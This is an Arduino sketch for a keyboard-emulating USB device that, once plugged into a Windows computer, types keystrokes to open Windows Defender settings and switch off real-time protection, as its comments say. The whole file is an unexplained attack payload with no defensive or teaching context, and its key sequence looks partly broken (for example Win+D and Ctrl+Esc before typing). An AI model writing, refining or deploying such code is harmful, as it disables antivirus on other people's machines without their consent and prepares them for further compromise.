#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(1000);
  // Open Windows Defender settings
      
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(100);
  print(F("Windows Defender Settings"));
  delay(100);
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  // Navigate to realtime protection and disable it
  delay(1000);
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  delay(1000);
  type(KEY_TAB, false);
  Keyboard.releaseAll();
  delay(250);
  type(KEY_TAB, false);
  Keyboard.releaseAll();
  delay(250);
  type(KEY_TAB, false);
  Keyboard.releaseAll();
  delay(250);
  type(KEY_TAB, false);
  Keyboard.releaseAll();
  delay(250);
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  delay(250);
  Keyboard.press(' ');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  delay(1000);
  type(KEY_RETURN, false);
  Keyboard.releaseAll();
  delay(250);
  
  
  // Release all Key
  Keyboard.releaseAll();
  Keyboard.end();
}
void type(int key, boolean release) {
  Keyboard.press(key);
  if(release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}
void loop(){}
